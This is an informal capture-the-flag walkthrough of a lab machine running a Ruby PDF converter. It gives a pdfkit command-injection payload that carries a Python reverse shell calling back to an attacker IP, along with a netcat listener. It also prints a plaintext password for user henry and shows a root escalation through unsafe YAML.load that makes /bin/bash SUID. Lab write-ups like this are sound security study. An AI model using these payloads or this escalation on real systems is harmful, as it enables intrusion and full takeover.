info:
Service built on ruby
Foothold: done using ruby SSTI on vuln verison of pdfconverter
Enum: Get userpass from some file in the user "ruby directory" on hidden .bundle  folder contains config file with password

PE: 
Malicious file

1. Add the ip to /etc/hosts file so it loads the page
2. Set up python server to test the uploads conversion to pdf
3. use `exiftool` to analyse pdf
	- Found out its using a vuln verison of pdfkit v0.8.6
	- Google it to find command injection is possible
	- Tried using ``"http://10.10.XX.XX/?name=%20#{id}"`` but didnt work
	- Solution was ``"http://10.10.XX.XX/?name=%20`id`"`` using backticks instead
	- get a payloal rev shell...python3 the only one that worked??
	- ``http://10.10.XX.XX/?name=%20`python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.XX.XX",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'\`
	- run nc -lvnp 9001 before uploading the shell
	- shud receive a bash shell

4.  Enumerate user "Ruby" to find password for user "henry" in some config file on a hidden .bundle folder
henry:Q3c1AqGHtoI0aXAYFH

5. ssh in using henry credentials
```bash
ssh henry@10.10.11.198
#enter password from above
```
6. cat the flag file in /henry/
7. Manually check for PE oppurtunities
	1. use sudo -l to list out folders that henry can access
	2. The follwing appears: 
	3. User henry may run the following commands on precious:
	    (root) NOPASSWD: /usr/bin/ruby /opt/update_dependencies.rb
	3. check out the folders to find a ruby file update_dependencies

8. cat /opt/update_dependencies.rb 
9. Found vulnerability used by the file to execute stuff with root priv
10. YAML.load is not safe due to 'YAML deserialisation attack'
```ruby
def list_from_file
    YAML.load(File.read("dependencies.yml"))
```
Should be using YAML.safe_load() instead
This means when dependencies.yml is changed, arbitrary code execution is possible

11. Test out the vuln (change the below line in the dependencies.yml file)
		git_set: id
	--> this should test if id is given when ruby is used to run the update_dependencies.rb code
	--> The id shud appear with below command
	```bash
	# ruby is used to run update_dependencies.rb with sudo priveledges from henry
 sudo /usr/bin/ruby /opt/update_dependencies.rb
```
12. PE time
	1. change the git_set to git_set: "chmod +s /bin/bash" 
	2. check `ls -al /bin/bash` to see if SUID (Set User ID) has been given to /bin/bash so that it runs as the owner of the file (ie running it as root)
	3. /bin/bash -p  --> runs bash  in priveledged mode, keeping the UID of the person who launched it (ie henry) but since +s is set the new bash terminal has root priv
13. Root access gained from above PE cat out the flags.